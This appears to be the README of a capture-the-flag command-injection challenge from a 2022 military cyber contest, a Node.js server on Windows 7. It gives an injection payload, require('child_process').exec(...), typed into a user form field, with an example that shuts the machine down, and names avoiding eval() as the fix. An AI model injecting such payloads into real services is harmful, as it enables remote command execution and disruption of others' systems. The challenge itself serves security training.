# ISC_Cmd_Injecrion_Web

## 111國軍盃網路攻防題目
> 環境windows7

## 創建方式

> 利用nodejs啟動

```
node server.js
```

## 攻擊方式
> 在輸入使用者表格注入
```
require("child_process").exec("windows 指令")
require("child_process").exec("shutdown -s -t 10")
```

## 修補方式

不要使用eval()函數
